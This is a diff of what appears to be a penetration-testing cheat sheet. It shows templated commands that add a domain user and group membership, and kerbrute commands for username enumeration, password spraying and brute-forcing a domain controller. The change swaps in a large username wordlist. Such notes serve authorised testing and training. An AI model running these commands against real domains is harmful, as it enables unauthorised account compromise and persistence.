@@ -658,7 +658,7 @@ net user {USERNAME} {PASSWORD} /add /domain
 net group "{GROUP}" {USERNAME} /add
 
 # Kerbrute Brute Force
-sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS}  {user.txt}  
+sudo /opt/kerbrute/kerbrute userenum -d {DOMAIN} --dc {IP ADDRESS} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt  
 sudo /opt/kerbrute/kerbrute passwordspray -d {DOMAIN} --dc {IP ADDRESS}  {user.txt} {passwords.txt}
 sudo /opt/kerbrute/kerbrute bruteuser -d {DOMAIN} --dc {IP ADDRESS} /usr/share/wordlists/rockyou.txt {USER}
 
